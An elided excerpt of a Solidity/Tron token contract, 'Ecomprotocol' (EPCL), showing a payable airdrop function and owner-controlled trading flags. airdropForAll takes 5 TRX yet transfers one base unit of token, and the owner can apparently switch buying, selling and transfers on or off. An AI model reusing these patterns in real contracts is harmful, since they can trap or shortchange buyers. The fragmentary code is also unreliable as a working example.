...
contract ERC20 is IERC20 {
    ...
    bool private airdropOn = false;
    
    
    uint256 public AirDropBuyPrice = 1 ;
    uint256 public airdropCap = 10000000 * 10 ** 18;  //10m
    uint256 private _tFeeTotal;
    uint256 public _taxFee = 5;     // tron  5 * 1000000
    uint256 public airdropTrx = 5 * 10**6;     // tron  6 * 1000000
    uint256 private _previousTaxFee = _taxFee;
    uint256 public dropAmount= 20 * 10 ** 18;
    
     function airdropForAll() public payable returns (bool) {
        require(airdropTrx == msg.value, "Enter Value According to Plan");
        ...
        _transfer(address(this), msg.sender,AirDropBuyPrice);
        return true;
    }
    ...
    public
    {
        ...
        if(mode_ == 5)
        {
            airdropOn = _boolValue;
        }
        
    }
    
    function showBoolean( ) public
    view  onlyOwner returns (bool,bool,bool,bool,bool)
    {
            return (BuyOn,SellOn,TransferOn,BuyDirectOn,airdropOn);
    ...
    {
            return (SellPrice,BuyPrice,DirectPercent,airdropCap,_taxFee,AirDropBuyPrice,airdropTrx);
 ...
 * `ERC20` functions.
 */
contract Ecomprotocol is ERC20, ERC20Detailed {

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor () public ERC20Detailed("Ecomprotocol", "EPCL", 18) {
